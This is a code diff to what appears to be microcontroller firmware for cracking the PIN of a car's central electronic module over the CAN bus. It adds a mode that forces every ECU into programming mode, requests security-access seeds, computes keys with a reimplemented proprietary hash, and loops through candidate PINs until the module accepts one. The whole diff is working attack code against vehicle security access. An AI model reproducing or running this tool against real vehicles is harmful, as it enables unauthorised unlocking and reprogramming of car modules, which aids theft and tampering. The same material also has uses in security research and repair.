@@ -10,6 +10,7 @@
 
 /* tunable parameters */
 
+#define P3
 #define SAMPLES        30   /* number of samples per sequence, more is better (up to 100) */
 #define CALC_BYTES     3     /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
 #define CEM_PN_AUTODETECT    /* comment out for P2 CEM-L on the bench w/o DIM */
@@ -148,12 +149,13 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
  *
  * canMsgSend - send message on the CAN bus (FlexCAN_T4 version)
  *
- * Returns: N/A
+ * Returns: 0 - was not sent
  */
 
-void canMsgSend (can_bus_id_t bus, uint32_t id, uint8_t *data, bool verbose)
+int canMsgSend (can_bus_id_t bus, bool ext, uint32_t id, uint8_t *data, bool verbose)
 {
   CAN_message_t msg;
+  int ret;
 
   if (verbose == true) {
       printf ("CAN_%cS ---> ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
@@ -165,21 +167,23 @@ void canMsgSend (can_bus_id_t bus, uint32_t id, uint8_t *data, bool verbose)
 
   msg.id = id;
   msg.len = 8;
-  msg.flags.extended = 1;
+  msg.flags.extended = ext;
   memcpy (msg.buf, data, 8);
 
   /* send it to the appropriate bus */
 
   switch (bus) {
     case CAN_HS:
-      can_hs.write (msg);
+      ret = can_hs.write(msg);
       break;
     case CAN_LS:
-      can_ls.write (msg);
+      ret = can_ls.write(msg);
       break;
     default:
+      ret = 0;
       break;
   }
+  return ret;
 }
 
 CAN_message_t can_hs_event_msg;
@@ -203,6 +207,9 @@ bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, int wait, boo
   bool     ret = false;
   volatile bool &msg_avail = (bus == CAN_HS ? can_hs_event_msg_available : can_ls_event_msg_available);
   CAN_message_t &msg = (bus == CAN_HS ? can_hs_event_msg : can_ls_event_msg);
+  uint64_t start = TSC;
+  uint64_t end = start + wait * 1000 * clockCyclesPerMicrosecond();
+  int _wait = wait;
 
   do {
 
@@ -221,16 +228,17 @@ bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, int wait, boo
       pData = msg.buf;
       ret = true;
     } else {
-      delay(1);
-      wait--;
+      _wait = TSC < end;
     }
-  } while (!ret && wait);
+  } while (!ret && _wait);
 
   /* no message, just return an error */
 
-  if (!ret)
+  if (!ret) {
+    uint64_t now = TSC;
+    wait && printf("canMsgReceive timed out, start %llu, now %llu, diff %u\n", start, now, now - start);
     return ret;
-
+  }
   /* save data to the caller if they provided buffers */
 
   if (id)
@@ -363,7 +371,7 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
   intr = false;
 
   /* send the unlock request */
-  canMsgSend (CAN_HS, 0xffffe, unlockMsg, verbose);
+  canMsgSend (CAN_HS, true, 0xffffe, unlockMsg, verbose);
 
   start = end = TSC;
   while (!intr && TSC < limit) {
@@ -422,7 +430,7 @@ unsigned long ecu_read_part_number(can_bus_id_t bus, unsigned char id)
 
   printf("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');
 yet_again:
-  canMsgSend(bus, 0xffffe, data, verbose);
+  canMsgSend(bus, true, 0xffffe, data, verbose);
   i = 0;
   j++;
   frame = 0;
@@ -467,7 +475,7 @@ unsigned long ecu_read_part_number_prog(can_bus_id_t bus, unsigned char id)
 
   printf("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');
 
-  canMsgSend(bus, 0xffffe, data, verbose);
+  canMsgSend(bus, true, 0xffffe, data, verbose);
   canMsgReceive(bus, &_id, data, 1000, verbose);
 
   for (int i = 0; i < 6; i++) {
@@ -488,12 +496,17 @@ unsigned long ecu_read_part_number_prog(can_bus_id_t bus, unsigned char id)
 
 void can_prog_mode()
 {
+#ifdef P3
+  uint8_t  data[CAN_MSG_SIZE] = { 0x02, 0x10, 0x82, 0x00, 0x00, 0x00, 0x00, 0x00 };
+#else
   uint8_t  data[CAN_MSG_SIZE] = { 0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+#endif
   uint32_t time = 5000;
   uint32_t delayTime = 5;
   bool     verbose = true;
 
   printf ("Putting all ECUs into programming mode.\n");
+  printf("\n === CEM-on-the-bench users: you have %d seconds to apply CEM power! ===\n\n", time / 1000);
 
   while(canMsgReceive(CAN_HS, NULL, NULL, 1, false));
 
@@ -503,9 +516,13 @@ void can_prog_mode()
     if ((time % 1000) == 0)
       k_line_keep_alive();
 
-    canMsgSend(CAN_HS, 0xffffe, data, verbose);
-    canMsgSend(CAN_LS, 0xffffe, data, verbose);
-
+#ifdef P3
+    canMsgSend(CAN_HS, false, 0x7df, data, verbose);
+    canMsgSend(CAN_LS, false, 0x7df, data, verbose);
+#else
+    canMsgSend(CAN_HS, true, 0xffffe, data, verbose);
+    canMsgSend(CAN_LS, true, 0xffffe, data, verbose);
+#endif
     verbose = false;
     time -= delayTime;
     delay (delayTime);
@@ -530,8 +547,8 @@ void progModeOff (void)
   /* broadcast a series of reset requests */
 
   for (uint32_t i = 0; i < 50; i++) {
-    canMsgSend (CAN_HS, 0xffffe, data, verbose);
-    canMsgSend (CAN_LS, 0xffffe, data, verbose);
+    canMsgSend (CAN_HS, true, 0xffffe, data, verbose);
+    canMsgSend (CAN_LS, true, 0xffffe, data, verbose);
 
     verbose = false;
     delay (100);
@@ -551,7 +568,7 @@ int seq_max_std(const void *a, const void *b)
   sequence_t *_a = (sequence_t *)a;
   sequence_t *_b = (sequence_t *)b;
 
-  return (int)(100 * _b->std) - (int)(100 *_a->std);
+  return (int)(100 * _b->std) - (int)(100 * _a->std);
 }
 
 /*******************************************************************************
@@ -597,7 +614,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
     /* show numerial values for the known digits */
 
-    for (i=0; i <= pos; i++) {
+    for (i = 0; i <= pos; i++) {
       printf ("%02x ", pin[i]);
     }
 
@@ -696,7 +713,6 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
     sequence[pin1].pinValue = pin[pos];
     sequence[pin1].latency  = prod;
     sequence[pin1].std  = std;
-
 
 #if defined(DUMP_BUCKETS)
     printf ("Average latency: %u\n", cem_reply_avg);
@@ -842,7 +858,7 @@ void cemCrackPin (uint32_t maxBytes, bool verbose)
 
   /* 5% of the remaining PINs to try */
 
-  percent_5 = pow (100, (remainingBytes))/20;
+  percent_5 = pow(100, remainingBytes) / 20;
 
   printf ("Progress: ");
 
@@ -911,7 +927,7 @@ void cemCrackPin (uint32_t maxBytes, bool verbose)
     data[6] = pinUsed[4];
     data[7] = pinUsed[5];
 
-    canMsgSend (CAN_HS, 0xffffe, data, verbose);
+    canMsgSend (CAN_HS, true, 0xffffe, data, verbose);
 
     /* get the response from the CEM */
 
@@ -1000,6 +1016,164 @@ bool find_cem_params(unsigned long pn, struct _cem_params *p)
   return false;
 }
 
+
+void p3_keep_alive(bool verbose)
+{
+  unsigned char msg[8] = { 0x3e, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+
+  canMsgSend(CAN_HS, false, 0x7df, msg, verbose);
+}
+
+void p3_hash(unsigned char *pin, unsigned char *seed, unsigned char *hash)
+{
+  unsigned int n = 0xc541a9, m = 0x1212050;
+  unsigned long long k;
+  unsigned char *in = (unsigned char *)&k;
+  struct foo {
+    unsigned int n0: 4, n1: 4, n2: 4, n3: 4, n4: 4, n5: 4, n6: 4, n7: 4;
+  } *out = (struct foo *)&n;
+  int i;
+
+  in[0] = seed[0];
+  in[1] = seed[1];
+  in[2] = seed[2];
+  in[3] = pin[0];
+  in[4] = pin[1];
+  in[5] = pin[2];
+  in[6] = pin[3];
+  in[7] = pin[4];
+
+  for (i = 0; i < 64; i++, n >>= 1, k >>= 1) {
+    if ((n ^ k) & 0x1)
+      n ^= m;
+  }
+
+  hash[0] = 0x10 * out->n2 + out->n1;
+  hash[1] = 0x10 * out->n3 + out->n5;
+  hash[2] = 0x10 * out->n0 + out->n4;
+}
+
+bool p3_cem_get_seed(unsigned char *seed, bool verbose)
+{
+  unsigned char msg[8] = { 0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00 };
+  bool ret = true;
+  uint32_t id;
+
+again:
+  do {
+    if (!ret) {
+      printf("%s: ugh...\n", __func__);
+      delay(1000);
+      verbose = true;
+      while (canMsgReceive(CAN_HS, NULL, NULL, 0, true));
+    }
+    canMsgSend(CAN_HS, false, 0x726, msg, verbose);
+    id = 0xff;
+    memset(msg, 0xff, sizeof(msg));
+    ret = canMsgReceive(CAN_HS, &id, msg, 1000, verbose);
+  } while (!ret);
+
+  if (ret && id == 0x72e && msg[0] == 0x05 && msg[1] == 0x67 && msg[2] == 0x01) {
+    memcpy(seed, msg + 3, 3);
+    if (seed[0] == 0 && seed[1] == 0 && seed[2] == 0)
+        printf("what? seed 0 0 0? ID %x, %02x %02x %02x %02x %02x %02x %02x %02x \n", id, msg[0], msg[1], msg[2], msg[3], msg[4], msg[5], msg[6], msg[7]);
+  } else {
+    printf("what? ID %x, %02x %02x %02x %02x %02x %02x %02x %02x \n", id, msg[0], msg[1], msg[2], msg[3], msg[4], msg[5], msg[6], msg[7]);
+    ret = false;
+    goto again;
+  }
+
+  return ret;
+}
+
+int p3_cem_send_key(unsigned char *key, bool verbose)
+{
+  unsigned char msg[8] = { 0x05, 0x27, 0x02, key[0], key[1], key[2], 0x00, 0x00 };
+  int ret = -1;
+  uint32_t id;
+
+  if (!canMsgSend(CAN_HS, false, 0x726, msg, verbose)) {
+    printf("%s: canMsgSend failed\n", __func__);
+    goto out;
+  }
+
+  if (!canMsgReceive(CAN_HS, &id, msg, 1000, verbose)) {
+    printf("%s: canMsgReceive failed\n", __func__);
+    goto out;
+  }
+
+  if (id == 0x72e && msg[0] == 0x02 && msg[1] == 0x67 && msg[2] == 0x02) {
+    printf("reply: ");
+    for (int i = 0; i < 8; i++)
+      printf("%02x ", msg[i]);
+    printf("\n");
+    ret = 1;
+  } else {
+    ret = 0;
+  }
+
+out:
+  return ret;
+}
+
+void p3_find_hash_collision(unsigned char *_seed, unsigned char *_key)
+{
+  unsigned char seed[3];
+  unsigned char key[3];
+  unsigned char pin[5] = { 0 };
+  unsigned int i = 0;
+  int ret;
+  bool verbose = false;
+  unsigned long now, last = TSC, diff;
+
+  for (int p1 = 0; p1 < 100; p1++) {
+    pin[1] = binToBcd(p1);
+    for (int p2 = 0; p2 < 100; p2++) {
+      pin[2] = binToBcd(p2);
+      for (int p3 = 0; p3 < 100; p3++) {
+        pin[3] = binToBcd(p3);
+        if ((p3 % 10) == 0)
+          p3_keep_alive(false);
+        for (int p4 = 0; p4 < 100; p4++) {
+          pin[4] = binToBcd(p4);
+retry:
+          p3_cem_get_seed(seed, verbose);
+          p3_hash(pin, seed, key);
+          now = TSC;
+          diff = (now - last) /  (1000 * clockCyclesPerMicrosecond());
+          if (verbose || diff >= 1000) {
+            printf("SEED %02x %02x %02x, PIN %02x %02x %02x %02x %02x, KEY %02x %02x %02x, %d pins/s\n", seed[0], seed[1], seed[2], pin[0], pin[1], pin[2], pin[3], pin[4], key[0], key[1], key[2], i);
+            last = now;
+            i = 0;
+          }
+          ret = p3_cem_send_key(key, verbose);
+          if (ret > 0)
+            goto out;
+          else if (ret < 0) { // need new seed
+            verbose = true;
+            goto retry;
+          }
+          verbose = false;
+          i++;
+        }
+      }
+    }
+  }
+out:
+  printf("hash collision found\n");
+  printf("SEED %02x %02x %02x, PIN %02x %02x %02x %02x %02x, KEY %02x %02x %02x, %d pins/s\n", seed[0], seed[1], seed[2], pin[0], pin[1], pin[2], pin[3], pin[4], key[0], key[1], key[2], i);
+  memcpy(_seed, seed, 3);
+  memcpy(_key, key, 3);
+}
+
+void p3_cem_crack_pin()
+{
+  unsigned char seed[3];
+  unsigned char key[3];
+
+  p3_find_hash_collision(seed, key);
+}
+
 bool initialized = false;
 
 /*******************************************************************************
@@ -1033,11 +1207,21 @@ void setup (void)
   printf ("CPU Maximum Frequency:   %u\n", F_CPU);
   printf ("CPU Frequency:           %u\n", F_CPU_ACTUAL);
   printf ("Execution Rate:          %u cycles/us\n", clockCyclesPerMicrosecond ());
+
+#ifdef P3
+  printf("Cracking P3\n");
+#else
   printf ("PIN bytes to measure:    %u\n", CALC_BYTES);
   printf ("Number of samples:       %u\n", SAMPLES);
+#endif
 
   long pn = 0;
 
+#ifdef P3
+  can_ls_init(CAN_125KBPS);
+  can_hs_init(CAN_500KBPS);
+  can_prog_mode();
+#else
 #if defined(CEM_PN_AUTODETECT)
   can_hs.begin();
   k_line_keep_alive();
@@ -1077,7 +1261,7 @@ void setup (void)
   if (!hs_inited)
       pn = ecu_read_part_number_prog(CAN_HS, CEM_HS_ECU_ID);
 #endif
-
+#endif // P3
   initialized = true;
   printf ("Initialization done.\n\n");
 }
@@ -1094,7 +1278,11 @@ void loop (void)
   bool verbose = false;
 
   if (initialized)
+#ifdef P3
+    p3_cem_crack_pin();
+#else
     cemCrackPin (CALC_BYTES, verbose);
+#endif
 
   /* exit ECU programming mode */
 
